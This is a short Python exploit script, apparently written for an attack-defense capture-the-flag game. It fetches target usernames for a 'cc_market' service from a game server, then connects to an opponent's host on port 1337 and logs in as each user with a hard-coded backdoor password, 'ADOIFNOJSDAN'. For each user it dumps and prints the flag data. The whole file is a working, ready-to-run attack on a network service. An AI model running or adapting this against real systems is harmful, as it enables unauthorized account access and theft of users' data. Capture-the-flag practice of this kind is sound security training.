#!/usr/bin/env python3

from pwn import remote 
import sys 
import json  
import subprocess
import requests

#cheat ADOIFNOJSDAN
#ip = "10.60.81.1"
ip = sys.argv[1]
response = requests.get(f"http://10.10.0.1:8081/flagIds?service=cc_market&team={ip}") 
data = json.loads(response.text)
us = data["cc_market"]
us = us[ip]
us = us  

# Connect to the server
r = remote(ip, 1337)

pw = "ADOIFNOJSDAN"
r.recvuntil(">")
for i in us:
    r.sendline("2")
    r.recvuntil("Username:")
    r.sendline(i)
    r.recvuntil("Password:")
    r.sendline(pw)
    r.recvuntil(">")
    r.sendline("6")
    dump = r.recvuntil("buy?")
    dump = dump.split(b"----")
    flag = dump[1]
    print(flag, flush=True)

r.close()